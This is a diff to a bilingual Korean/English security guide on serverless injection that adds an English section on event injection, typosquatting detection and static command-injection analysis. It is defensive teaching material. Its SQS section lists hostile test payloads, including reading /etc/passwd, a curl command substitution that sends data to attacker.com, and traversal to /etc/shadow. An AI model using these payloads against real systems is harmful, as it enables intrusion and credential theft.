@@ -1,3 +1,9 @@
+> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)
+
+---
+
+<a name="한국어"></a>
+
 # 서버리스 인젝션 — 이벤트 주입·의존성 공격·탐지
 
 ## 1. 서버리스 인젝션 분류
@@ -373,12 +379,12 @@ def main() -> None:
         all_findings.extend(analyze_file(f))
 
     filtered = [f for f in all_findings if risk_levels[f.risk] >= min_level]
-    print(f"[*] {len(files)}개 파일 분석 / {len(filtered)}개 이슈")
+    print(f"[*] {len(files)} files analyzed / {len(filtered)} issues found")
 
     for finding in sorted(filtered, key=lambda x: risk_levels[x.risk], reverse=True):
         print(f"\n[{finding.risk}] {finding.file}:{finding.line}")
-        print(f"  함수: {finding.function}")
-        print(f"  코드: {finding.code}")
+        print(f"  Function: {finding.function}")
+        print(f"  Code: {finding.code}")
 
 
 if __name__ == "__main__":
@@ -442,3 +448,107 @@ def handler(event: dict, context) -> dict:
 | `Prowler` | AWS 보안 설정 감사 |
 | `Snyk` | 의존성 취약점 탐지 |
 | `pip-audit` | Python 의존성 감사 |
+
+---
+
+<a name="english"></a>
+
+# Serverless Injection — Event Injection, Dependency Attacks, and Detection
+
+## 1. Serverless Injection Classification
+
+Serverless functions receive data from various event sources, creating an injection vector at each event source.
+
+| Event Source | Injection Vector |
+|-------------|-----------------|
+| API Gateway | HTTP parameters, headers, body |
+| SQS/SNS | Message body |
+| S3 | File name, metadata |
+| DynamoDB Streams | Record values |
+| EventBridge | Event patterns |
+| Cognito | User attributes |
+
+---
+
+## 2. Event-based Injection Patterns
+
+### 2.1 SQS Message Injection
+
+Serverless functions that process SQS messages are vulnerable to command injection when message body content is passed directly to shell commands. The vulnerable pattern uses `shell=True` with unsanitized input; the safe pattern validates the JSON payload and uses a list-based subprocess call to prevent shell interpretation.
+
+**Injection payloads for testing:**
+- `"; cat /etc/passwd"` — command separator injection
+- `"$(curl attacker.com/$(whoami))"` — command substitution
+- `"../../etc/shadow"` — path traversal
+- Very long strings — buffer overflow
+- Null bytes — string termination
+
+### 2.2 S3 Trigger Filename Injection
+
+When S3 object creation triggers a Lambda function, the object key (filename) is an untrusted input. Validation must:
+1. Reject path traversal sequences (`..`, leading `/`)
+2. Validate filename against a safe character whitelist pattern
+3. Block dangerous file extensions (`.exe`, `.sh`, `.py`, `.php`, etc.)
+4. Move rejected files to a quarantine bucket rather than processing them
+
+---
+
+## 3. Dependency Attacks (Supply Chain)
+
+### 3.1 Typosquatting Detection
+
+The typosquatting detector analyzes `requirements.txt` files and identifies packages with names suspiciously similar to popular packages (Levenshtein distance ≤ 2). It then checks whether the suspicious package actually exists on PyPI.
+
+**Common typosquatting transformations:**
+- Character substitution: `o→0`, `i→l`, `l→1`
+- Prefix/suffix additions: `python-requests`, `requests-python`
+- Separator changes: `boto-3` vs `boto3`
+- Single character deletions or additions
+
+**Usage:**
+```bash
+python3 typosquat_detector.py requirements.txt -o suspicious.json
+```
+
+---
+
+## 4. Serverless OS Command Injection
+
+The static analysis tool uses Python's `ast` module to parse Lambda function source code and identify dangerous function calls. Risk is classified as:
+
+- **HIGH**: `shell=True` with a dynamically constructed string argument (f-string, concatenation, or function call)
+- **MEDIUM**: `shell=True` with any argument
+- **LOW**: Dangerous function without `shell=True`
+
+**Dangerous functions monitored:**
+`subprocess.call`, `subprocess.run`, `subprocess.Popen`, `subprocess.check_output`, `subprocess.check_call`, `os.system`, `os.popen`, `os.execv`, `os.execve`, `eval`, `exec`
+
+**Usage:**
+```bash
+python3 command_injection_analyzer.py ./lambda_src/ --min-risk HIGH
+```
+
+---
+
+## 5. Runtime Injection Defense Pattern
+
+Using AWS Lambda Powertools, a JSON Schema validates all incoming API Gateway events before processing. The schema enforces:
+- `user_id` must match UUID v4 format (regex)
+- `action` must be one of an enumerated set of allowed values
+- `data` object cannot have more than 20 properties
+- No additional properties are allowed beyond the defined ones
+
+Any validation failure returns HTTP 400 immediately without reaching business logic.
+
+---
+
+## 6. Reference Tools
+
+| Tool | Purpose |
+|------|---------|
+| `Semgrep` | Static analysis for serverless code |
+| `PMapper` | AWS IAM permission graph analysis |
+| `ScoutSuite` | Cloud security auditing |
+| `Prowler` | AWS security configuration audit |
+| `Snyk` | Dependency vulnerability detection |
+| `pip-audit` | Python dependency auditing |
